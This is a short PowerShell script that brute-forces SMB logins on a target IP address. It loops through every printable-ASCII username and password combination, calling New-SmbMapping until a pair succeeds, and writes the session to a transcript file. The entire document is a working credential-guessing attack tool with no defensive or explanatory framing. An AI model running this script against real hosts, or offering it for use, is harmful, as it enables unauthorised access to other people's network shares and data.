param ($IPAddr = $(throw "Need IP Address"))

# TODO: Just checks ASCII since the letters are the most used, for more Unicode values a parameter can be added
$LastASCIINum = 126 
$FirstASCIINum = 33
$MaxLength = 1 
$OldMaxLength = 0
$MaxLengthInc = 1 # Incrementation value to update the maximum length for username and password

Start-Transcript -path C:\Users\oyku_\Desktop\file2.txt

function updateList{
param ([int[]]$list)

for ($i = $list.Length-1; $i -ge 0 ; $i--){
    $list[$i] ++
    if ( $list[$i] -gt $LastASCIINum ){
        if ($i -ne 0 ){
            $list[$i] = $FirstASCIINum
        }
        else{
            [int[]]$list2 = ,$FirstASCIINum * ($list.Length+1)  # Increase the length and continue
            return $list2
        }
    }
    else {
        break
    }
}
return $list
}

function createString{
param ([int[]]$list)
$out = $null;
   for ($i = 0; $i -lt $list.Length ; $i++){
       $out+=[char]$list[$i] # display as an ASCII character
   }
   return $out
}

function brute {

[int[]]$userPtr =  $FirstASCIINum # username can not be null
[int[]]$passPtr =  $FirstASCIINum - 1 # password can be null
$user = createString $userPtr #changes to String
$pass = createString $passPtr #changes to String
$Result = $null

# TODO: username can't be null, space and can not use some characters ( " / \ [ ] : ; | = , + * ? < > ) , password does not have null (except just null), 
#Continue till find a match
:outer while ($true) {

while ($userPtr.Length -le $MaxLength) {

    while ($passPtr.Length -le $MaxLength){ #check pass for this user
        $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
        if ($Result -ne $null){
            break outer
        }
        Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
        $passPtr = updateList $passPtr
        $pass = createString $passPtr
    }
    $userPtr = updateList $userPtr
    $user = createString $userPtr 
    if ( $OldMaxLength -eq 0 -or $userPtr.Length -gt $OldMaxLength) {
        $passPtr =  $FirstASCIINum - 1 # needs to start from the beginning
    }
    else {
        $passPtr =   @($FirstASCIINum) * ($OldMaxLength+1)
    }
    $pass = createString $passPtr
}
$OldMaxLength = $MaxLength
$MaxLength += $MaxLengthInc
$userPtr = $FirstASCIINum
$user = createString $userPtr
$passPtr =  @($FirstASCIINum) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
$pass = createString $passPtr
}
}

brute
Stop-Transcript